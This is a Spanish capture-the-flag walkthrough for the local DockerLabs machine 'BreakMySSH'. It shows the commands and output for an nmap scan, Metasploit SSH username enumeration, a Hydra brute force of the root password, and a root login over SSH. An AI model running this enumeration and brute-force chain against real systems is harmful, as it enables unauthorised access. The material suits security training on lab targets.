Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "BreakMySSH".
Una vez hecho , descomprimimos el archivo, e inicializamos la maquina con el comando:
```
bash auto_deploy.sh breakmyssh.tar
```
Tras desplegarse la maquina, hacemos un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 -n -Pn -vvv 172.17.0.2
```
y vemos que tiene un puerto abierto, el 22 (SSH):
```
Discovered open port 22/tcp on 172.17.0.2
```
Ademas, tenemos esta otra informacion:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.7 (protocol 2.0)
```
Ahora podriamos ir a METASPLOIT y buscar si hay algun exploit que haga uso del "openssh 7" y vemos el siguiente resultado:
```
msf6 > search openssh 7

Matching Modules
================

   #  Name                                         Disclosure Date  Rank    Check  Description
   -  ----                                         ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_enumusers          .                normal  No     SSH Username Enumeration
   1    \_ action: Malformed Packet                .                .       .      Use a malformed packet
   2    \_ action: Timing Attack                   .                .       .      Use a timing attack
   3  exploit/windows/local/unquoted_service_path  2001-10-25       great   Yes    Windows Unquoted Service Path Privilege Escalation
```
Como nos interesa enumerar los usuarios para luego intentar usar la fuerza bruta con HYDRA sobre su contraseña, elegimos el "0" y vemos sus opciones:
```
msf6 > use 0   <=== Elegimos el 0

msf6 auxiliary(scanner/ssh/ssh_enumusers) > options  <=== Vemos las opciones

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CHECK_FALSE   true             no        Check for false positives (random username)
   
   DB_ALL_USERS  false            no        Add all users in the current database to the list
   
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   
   RPORT         22               yes       The target port
   
   THREADS       1                yes       The number of concurrent threads (max one per host)
   
   THRESHOLD     10               yes       Amount of seconds needed before a user is considered found (timing attack only)
   
   USERNAME                       no        Single username to test (username spray)
   
   USER_FILE                      no        File containing usernames, one per line
```
En este caso, configuraremos el RHOSTS con la IP de la maquina victima y el diccionario para comprobar usuarios:
```
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 172.17.0.2

msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```
Una vez hecho esto, lo ejecutamos con "run" y tras una pequeña espera obtenemos:
```
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 172.17.0.2:22 - SSH - Using malformed packet technique
[*] 172.17.0.2:22 - SSH - Checking for false positives
[*] 172.17.0.2:22 - SSH - Starting scan
[+] 172.17.0.2:22 - SSH - User 'mail' found
[+] 172.17.0.2:22 - SSH - User 'root' found
[+] 172.17.0.2:22 - SSH - User 'news' found
[+] 172.17.0.2:22 - SSH - User 'man' found
[+] 172.17.0.2:22 - SSH - User 'bin' found
[+] 172.17.0.2:22 - SSH - User 'games' found
[+] 172.17.0.2:22 - SSH - User 'nobody' found
[+] 172.17.0.2:22 - SSH - User 'lovely' found
[+] 172.17.0.2:22 - SSH - User 'backup' found
[+] 172.17.0.2:22 - SSH - User 'daemon' found
[+] 172.17.0.2:22 - SSH - User 'proxy' found
```
No se si habria mas, pero me interesa sobre todo el usuario "root", por lo que vamos a hacer fuerza bruta con HYDRA para ver si obtenemos su contraseña:
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Y unos minutillos despues el terminal nos muestra lo siguiente:
```
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```
Es momento entonces de intentar entrar por SSH introduciendo las credenciales obtenidas:
```
ssh root@172.17.0.2
```
Y tras responder "yes" a la primera pregunta y poner la contraseña, ya estamos dentro como usuario "root":
```
root@c2cff4659e7b:~# whoami
root

root@c2cff4659e7b:~#
```
